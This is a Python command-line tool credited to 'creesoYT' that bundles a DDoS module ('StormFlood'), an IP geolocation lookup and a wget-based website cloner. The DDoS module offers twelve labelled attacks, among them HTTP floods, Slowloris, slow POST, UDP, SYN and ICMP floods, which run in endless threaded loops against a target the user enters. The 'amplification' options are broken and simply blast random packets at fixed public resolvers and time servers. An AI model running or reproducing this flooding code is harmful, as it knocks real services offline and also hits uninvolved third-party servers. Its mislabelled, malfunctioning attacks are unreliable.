import os
import sys
import threading
import time
import socket
import random
import requests
import subprocess
from urllib.parse import urlparse
from datetime import datetime
import re
import http.client

# ----------------- COLORS -----------------
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
MAGENTA = "\033[1;35m"
RESET = "\033[0m"

# ----------------- BANNERS -----------------
STORM_BANNER = f"""
{RED}   ____  _ _                              _____ _           _ 
  / ___|| |_ ___  _ __ ___   ___  _ __ | ___(_)_ __   __| |
  \___ \| __/ _ \| '_ ` _ \ / _ \| '_ \| |_  | | '_ \ / _` |
   ___) | || (_) | | | | | | | (_) | | |  _| | | | | (_| |
  |____/ \__\___/|_| |_| |_|\___/|_| |_|_|   |_|_| |_|\__,_|
                     Author: creesoYT
                     Program: StormFlood{RESET}
"""

IPX_BANNER = f"""
{CYAN}
███████╗██████╗ ██████╗  ██████╗ ███████╗███████╗
██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝
█████╗  ██████╔╝██████╔╝██║   ██║█████╗  █████╗  
██╔══╝  ██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  ██╔══╝  
███████╗██║     ██║     ╚██████╔╝███████╗███████╗
╚══════╝╚═╝     ╚═╝      ╚═════╝ ╚══════╝╚══════╝
          {YELLOW}IPXplorer Ultimate CLI v5.1{CYAN}
             Author: {RED}creesoYT{CYAN}
{RESET}
"""

SITE_BANNER_LINES = [
f"""
{CYAN}   ____  _ _        ____  _       _                     
  / ___|(_) |_ ___ / ___|| |_ ___| |_ ___  _ __ ___      
 | |    | | __/ _ \\___ \\| __/ _ \\ __/ _ \\| '__/ _ \\     
 | |___ | | ||  __/___) | ||  __/ || (_) | | |  __/     
  \\____|_|\\__\\___|____/ \\__\\___|\\__\\___/|_|  \\___|{RESET}
""",
f"{MAGENTA}                 SITE SNIPER v7.0{RESET}",
f"{CYAN}------------------------------------------------------------{RESET}",
f"   Author: creesoYT",
f"   Features:",
f"     - Multi-threaded downloads",
f"     - Real-time byte progress bar",
f"     - Animated hacky banner",
f"     - Auto folder naming",
f"     - Colorful terminal messages",
f"{CYAN}------------------------------------------------------------{RESET}"
]

# ----------------- STORMFLOOD FUNCTIONS -----------------
def stormflood():
    print(STORM_BANNER)
    print("[1]: HTTP/HTTPS Flood")
    print("[2]: HTTP/2 & HTTP/3 Flood")
    print("[3]: Slowloris (Low & Slow)")
    print("[4]: Slow POST / Slow Read")
    print("[5]: TCP SYN Flood")
    print("[6]: TCP ACK/FIN/RST Flood")
    print("[7]: UDP Flood")
    print("[8]: ICMP Flood / Ping of Death")
    print("[9]: DNS Amplification")
    print("[10]: NTP Amplification")
    print("[11]: Memcached Amplification")
    print("[12]: Chargen / SNMP / LDAP / SSDP Amplification")

    choice = input("Select attack type [1-12]: ").strip()
    target_ip = input("Enter Target IP or URL: ").strip()
    target_port = 0
    if choice in ["5","6","7"]:
        target_port = int(input("Enter Target Port (if applicable): "))
    threads = int(input("Enter number of threads (recommended 5-20 for safety): "))
    ip_version = socket.AF_INET
    if choice in ["1","2","3","4","5","6","7","8"]:
        ipver_choice = input("[1]: IPv4\n[2]: IPv6\nSelect IP version [1/2]: ").strip()
        if ipver_choice=="2":
            ip_version = socket.AF_INET6
    data_size = 1024
    if choice in ["5","6","7"]:
        data_size = int(input("Enter Data Size to Send (in bytes, max 65535 recommended): "))

    # --------- Attack Functions ---------
    def http_https_flood():
        counter=0
        while True:
            try:
                r=requests.get(target_ip)
                counter+=1
                if counter%10==0:
                    print(f"[HTTP/HTTPS] Requests Sent: {counter}, Status: {r.status_code}")
            except: pass

    def http2_3_flood():
        counter=0
        while True:
            try:
                conn = http.client.HTTPSConnection(target_ip)
                conn.request("GET","/")
                counter+=1
                if counter%10==0:
                    print(f"[HTTP/2&3] Requests Sent: {counter}")
                conn.close()
            except: pass

    def slowloris():
        counter=0
        while True:
            try:
                sock=socket.socket(ip_version,socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip,80))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
                counter+=1
                if counter%5==0:
                    print(f"[Slowloris] Partial Requests Sent: {counter}")
                time.sleep(15)
            except: pass

    def slow_post_read():
        counter=0
        while True:
            try:
                sock=socket.socket(ip_version,socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip,80))
                sock.send(b"POST / HTTP/1.1\r\n")
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Content-Length: 100000\r\n\r\n")
                counter+=1
                if counter%5==0:
                    print(f"[Slow POST/Read] Partial Requests Sent: {counter}")
                time.sleep(15)
            except: pass

    def tcp_syn_flood():
        counter=0
        try:
            sock=socket.socket(ip_version,socket.SOCK_RAW,socket.IPPROTO_TCP)
        except PermissionError:
            print("[TCP SYN] Run as root!")
            return
        while True:
            try:
                sock.sendto(random._urandom(data_size),(target_ip,target_port))
                counter+=1
                if counter%10==0:
                    print(f"[TCP SYN] Packets Sent: {counter}")
            except: pass

    def tcp_ack_fin_rst_flood():
        counter=0
        while True:
            try:
                sock=socket.socket(ip_version,socket.SOCK_RAW,socket.IPPROTO_TCP)
                sock.sendto(random._urandom(data_size),(target_ip,target_port))
                counter+=1
                if counter%10==0:
                    print(f"[TCP ACK/FIN/RST] Packets Sent: {counter}")
            except: pass

    def udp_flood():
        sock=socket.socket(ip_version,socket.SOCK_DGRAM)
        data=random._urandom(data_size)
        counter=0
        while True:
            try:
                sock.sendto(data,(target_ip,target_port))
                counter+=1
                if counter%10==0:
                    print(f"[UDP] Packets Sent: {counter}")
            except: pass

    def icmp_flood():
        sock=socket.socket(ip_version,socket.SOCK_RAW,socket.IPPROTO_ICMP)
        counter=0
        while True:
            try:
                sock.sendto(random._urandom(64),(target_ip,0))
                counter+=1
                if counter%10==0:
                    print(f"[ICMP] Packets Sent: {counter}")
            except: pass

    def dns_amplification():
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        reflectors=["8.8.8.8","1.1.1.1"]
        payload=random._urandom(1024)
        counter=0
        while True:
            try:
                for r in reflectors:
                    sock.sendto(payload,(r,53))
                counter+=len(reflectors)
                if counter%10==0:
                    print(f"[DNS Amplification] Packets Sent: {counter}")
            except: pass

    def ntp_amplification():
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        reflectors=["129.6.15.28"]
        payload=random._urandom(1024)
        counter=0
        while True:
            try:
                for r in reflectors:
                    sock.sendto(payload,(r,123))
                counter+=len(reflectors)
                if counter%10==0:
                    print(f"[NTP Amplification] Packets Sent: {counter}")
            except: pass

    def memcached_amplification():
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        reflectors=["127.0.0.1"]
        payload=random._urandom(1024)
        counter=0
        while True:
            try:
                for r in reflectors:
                    sock.sendto(payload,(r,11211))
                counter+=len(reflectors)
                if counter%10==0:
                    print(f"[Memcached Amplification] Packets Sent: {counter}")
            except: pass

    def chargen_snmp_ldap_ssdp_amplification():
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        reflectors=["8.8.8.8"]
        ports=[19,161,389,1900]
        payload=random._urandom(1024)
        counter=0
        while True:
            try:
                for r in reflectors:
                    for p in ports:
                        sock.sendto(payload,(r,p))
                counter+=len(reflectors)*len(ports)
                if counter%10==0:
                    print(f"[Chargen/SNMP/LDAP/SSDP Amplification] Packets Sent: {counter}")
            except: pass

    attack_dict = {
        "1": http_https_flood,
        "2": http2_3_flood,
        "3": slowloris,
        "4": slow_post_read,
        "5": tcp_syn_flood,
        "6": tcp_ack_fin_rst_flood,
        "7": udp_flood,
        "8": icmp_flood,
        "9": dns_amplification,
        "10": ntp_amplification,
        "11": memcached_amplification,
        "12": chargen_snmp_ldap_ssdp_amplification
    }

    for _ in range(threads):
        t=threading.Thread(target=attack_dict[choice])
        t.daemon=True
        t.start()

    while True:
        time.sleep(0.1)

# ----------------- IPXplorer -----------------
def ipxplorer():
    print(IPX_BANNER)
    def fetch_ip(ip):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
            data = response.json()
            if data['status']!='success':
                print(f"{RED}❌ IP not found or invalid.{RESET}")
                return None
            return data
        except Exception as e:
            print(f"{RED}💀 Error occurred: {e}{RESET}")
            return None
    def display_ip(data):
        print(f"{GREEN}═════════════════════════════════════════════{RESET}")
        print(f"{YELLOW}IP:{RESET} {CYAN}{data['query']}{RESET}")
        print(f"{YELLOW}Country:{RESET} {CYAN}{data['country']} ({data['countryCode']}){RESET}")
        print(f"{YELLOW}City:{RESET} {CYAN}{data['city']}{RESET}")
        print(f"{YELLOW}Region:{RESET} {CYAN}{data['regionName']}{RESET}")
        print(f"{YELLOW}ISP:{RESET} {CYAN}{data['isp']}{RESET}")
        print(f"{YELLOW}Org:{RESET} {CYAN}{data['org']}{RESET}")
        print(f"{YELLOW}Timezone:{RESET} {CYAN}{data['timezone']}{RESET}")
        print(f"{YELLOW}LAT/LON:{RESET} {CYAN}{data['lat']} / {data['lon']}{RESET}")
        print(f"{GREEN}═════════════════════════════════════════════{RESET}\n")
    while True:
        ip=input("Enter IP (or type 'exit'): ").strip()
        if ip.lower()=='exit':
            break
        data=fetch_ip(ip)
        if data:
            display_ip(data)

# ----------------- SITE SNIPER -----------------
def sitesniper():
    for line in SITE_BANNER_LINES:
        print(line)
    base_folder = input(f"Enter the folder to save sites (leave empty for current folder): ")
    while True:
        urls = input("Enter URLs to clone (space separated, or 'exit'): ").split()
        if 'exit' in urls: break
        threads=[]
        for url in urls:
            t=threading.Thread(target=download_site, args=(url, base_folder))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        cont=input("Do you want to download another site? (y/n): ").strip().lower()
        if cont!='y':
            break
    print(f"{MAGENTA}[+] All downloads completed!{RESET}")

def create_folder_name(url):
    domain=urlparse(url).netloc.replace('.','_')
    timestamp=datetime.now().strftime("%Y%m%d%H%M%S")
    return f"{domain}_{timestamp}"

def print_progress_bar(current,total,length=40):
    percent=int((current/total)*100) if total else 0
    filled_length=int(length*current//total) if total else 0
    bar='█'*filled_length+'-'*(length-filled_length)
    sys.stdout.write(f"\r{YELLOW}[{bar}] {percent}%{RESET}")
    sys.stdout.flush()
    if current>=total and total!=0:
        print()

def download_site(url,base_folder):
    if not base_folder:
        target_folder=os.path.join(os.getcwd(),create_folder_name(url))
    else:
        target_folder=os.path.join(base_folder,create_folder_name(url))
        if not os.path.exists(target_folder):
            os.makedirs(target_folder)
    print(f"{CYAN}[+] Downloading {url} into {target_folder}{RESET}")
    command=["wget","--mirror","--convert-links","--adjust-extension",
             "--page-requisites","--no-parent","--progress=dot","-P",target_folder,url]
    process=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
    total_bytes=0
    downloaded_bytes=0
    for line in process.stdout:
        match_total=re.search(r"Length: (\d+)",line)
        if match_total:
            total_bytes=int(match_total.group(1))
        match_bytes=re.findall(r"(\d+)",line.replace('.',''))
        if match_bytes:
            downloaded_bytes+=sum(map(int,match_bytes))
            print_progress_bar(min(downloaded_bytes,total_bytes),max(total_bytes,1))
    process.wait()
    print(f"{GREEN}[+] Finished downloading {url}{RESET}")

# ----------------- MAIN MENU -----------------
def main():
    main_banner = f"""
{MAGENTA}================ Main Menu ================ {RESET}
1: StormFlood (DDoS Attacks)
2: IPXplorer (IP Lookup)
3: Site Sniper (Website Cloner)
"""
    print(main_banner)
    choice=input("Select module [1/2/3]: ").strip()
    if choice=="1":
        stormflood()
    elif choice=="2":
        ipxplorer()
    elif choice=="3":
        sitesniper()
    else:
        print(f"{RED}Invalid selection!{RESET}")

if __name__=="__main__":
    main()

